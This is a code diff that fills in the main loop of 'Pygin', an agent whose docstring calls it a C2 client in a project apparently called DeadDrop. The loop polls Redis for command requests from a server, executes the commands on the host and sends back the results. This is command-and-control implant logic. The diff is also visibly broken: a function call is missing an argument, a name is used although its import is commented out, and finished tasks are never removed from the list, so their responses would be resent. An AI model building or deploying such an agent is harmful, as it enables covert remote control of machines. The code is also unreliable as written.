@@ -2,6 +2,8 @@
 The main process loop.
 """
 
+from dataclasses import dataclass
+from datetime import datetime
 from pathlib import Path
 import argparse
 import logging
@@ -13,8 +15,9 @@ import redis
 
 # from celery.result import AsyncResult
 
-from src.agent_code import config, utility
+from src.agent_code import config, utility, tasks
 from src.protocols._shared_lib import PyginMessage
+from src.libs.protocol_lib import DeadDropMessageType, DeadDropMessage
 
 # Default configuration path. This is the configuration file included with the
 # agent by default.
@@ -29,6 +32,16 @@ logging.basicConfig(
 )
 logger = logging.getLogger()
 
+
+@dataclass
+class CommandTask:
+    """
+    Simple dataclass representing a command in progress and its corresponding
+    command_request.
+    """
+    start_time: datetime
+    cmd_request: DeadDropMessage
+    task_result: AsyncResult
 
 def get_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="The Pygin main process.")
@@ -50,7 +63,7 @@ def get_args() -> argparse.Namespace:
 def get_new_msgs(
     cfg_obj: config.PyginConfig, 
     app: celery.Celery, 
-    remove_msgs: bool = True
+    remove_task_results: bool = True
 ) -> list[PyginMessage]:
     """
     Get and reconstruct all new messages in the Redis database.
@@ -85,7 +98,7 @@ def get_new_msgs(
     
     :param cfg_obj: The global Pygin configuration object.
     :param app: The Celery application tied to the Redis database.
-    :param remove_msgs: Whether to delete the task result entries in Redis 
+    :param remove_task_results: Whether to delete the task result entries in Redis 
         after retrieval. Note that this refers to the celery-task-meta-*
         entries in the database, which may be deleted or kept without 
         consequence.
@@ -107,7 +120,30 @@ def get_new_msgs(
     # the associated result (which amounts to a DEL call to the Redis backend)
     # if specified.
     for task_id in task_ids:
-        AsyncResult(task_id, app=app). # TODO LOOK AT ME
+        # We set a timeout of five seconds for the async result. There should
+        # be no reason that the task is in the "inbox" but is also not complete,
+        # but this serves as a safety measure.
+        task = AsyncResult(task_id, app=app)
+        if task.status is not celery.states.SUCCESS:
+            logger.warning(f"Task {task_id} is in a non-sucessful state ({task.status})")
+        msgs: list[PyginMessage] = task.get(timeout=5)
+        
+        for msg in msgs:
+            msg_id_str = str(msg.message_id)
+            
+            # Check if this message's ID (as a string) is already present
+            # in the list of messages the control unit has seen. If it is,
+            # warn and drop the message from the result.
+            if redis_con.sismember(cfg_obj.REDIS_MAIN_PROCESS_MESSAGES_SEEN_KEY, msg_id_str):
+                logger.warning(f"Duplicate message seen by control unit, dropping (msg id: {msg_id_str})")
+            else:
+                result.append(msg)
+                redis_con.sadd(cfg_obj.REDIS_MAIN_PROCESS_MESSAGES_SEEN_KEY, msg_id_str)
+            
+        if remove_task_results:
+            # This effectively results in a delete call to the Redis backend.
+            task.forget()
+
     return result
 
 
@@ -142,7 +178,28 @@ def get_stored_tasks(
         task_results.append(AsyncResult(task_id, app=app))
     return task_results
 
-
+def construct_cmd_response(
+    cfg: config.PyginConfig,
+    start_time: datetime,
+    cmd_request: DeadDropMessage,
+    task_result: AsyncResult
+) -> DeadDropMessage:
+    """
+    Construct a command_repsonse messsage from the result of a task.
+    """
+    # TODO: Note that this message is unsigned! I think construction of the
+    # signature should be the message dispatch unit's problem.
+    return DeadDropMessage(
+        message_type = DeadDropMessageType.CMD_RESPONSE,
+        user_id = cmd_request.user_id,
+        source_id = cfg.AGENT_ID,
+        payload = {
+            "cmd_name": cmd_request.payload['cmd_name'],
+            "start_time": start_time.timestamp(),
+            "end_time": task_result.date_done.timestamp(),
+            "result": task_result.get()
+        }
+    )
 
 def entrypoint(cfg_obj: config.PyginConfig, app: celery.Celery) -> None:
     """
@@ -157,20 +214,47 @@ def entrypoint(cfg_obj: config.PyginConfig, app: celery.Celery) -> None:
 
     Upon identifying that either of these has occurred, this "main" process takes
     action accordingly.
+    
+    (I guess that's all C2 clients do, but this turned out to be really complicated!)
     """
-    # Invoke the "get new messages task". Store the AsyncResult in a list.
-
-    # Check if any of the "get new messages" tasks in previous runs have completed.
-    # If so, retrieve their results and delete the associated task from the Redis
-    # database.
-
-    # For each message receieved (which should always be command_request), invoke
-    # the command execution task. Store that AsyncResult in a list.
-
-    # Check if any of the command executions have finished. If so, log it, and
-    # then invoke the "send message" task.
-
-    raise NotImplementedError
+    # Stores pairs of AsyncResults and their originating command_request message.
+    running_commands: list[CommandTask] = []
+    
+    while True:
+        # Check for new messages. For each message received (which should always
+        # be command_request), invoke the command execution task. Store that
+        # unfinished AsyncResult.
+        for message in get_new_msgs(cfg_obj, app):
+            if message.message_type != DeadDropMessageType.CMD_REQUEST:
+                logger.error(f"Got unexpected message from server: {message}")
+            
+            logger.debug(f"Got the following message: {message}")
+            logger.info(f"Received message with message ID {message.message_id}")
+            try:
+                task = tasks.execute_command.delay(message.payload['cmd_name'], message.payload['cmd_args'])
+                running_commands.append(CommandTask(datetime.utcnow(), message, task))
+            except Exception as e:
+                # Handle arbitrary exceptions for scheduling itself.
+                logger.error(f"Could not successfully schedule execution for the command: {e}")
+        
+        # Check if any of the command executions have finished. If so, log it, and
+        # then invoke the "send message" task.
+        for cmd_task in running_commands:
+            cmd_request = cmd_task.cmd_request
+            task = cmd_task.task_result
+            
+            if task.ready():
+                if task.failed():
+                    logger.error(f"The task for command_request {cmd_request.message_id} failed: {task.traceback}")
+                    continue
+                
+                cmd_response = construct_cmd_response(cmd_task.start_time, cmd_request, task)
+                logger.info(f"Command finished, sending command_response with ID {cmd_response.message_id}")
+                logger.debug(f"Command response: {cmd_response}")
+                try:
+                    tasks.send_msg(cfg_obj, cmd_response, cfg_obj.SENDING_PROTOCOL)
+                except Exception as e:
+                    logger.error(f"Could not successfully schedule sending the following command_response: {cmd_response}")
 
 
 if __name__ == "__main__":
@@ -183,4 +267,4 @@ if __name__ == "__main__":
 
     # Start the main agent loop with the new configuration information and the
     # global Celery tasking.
-    # entrypoint(cfg_obj, tasks.app)
+    entrypoint(cfg_obj, tasks.app)
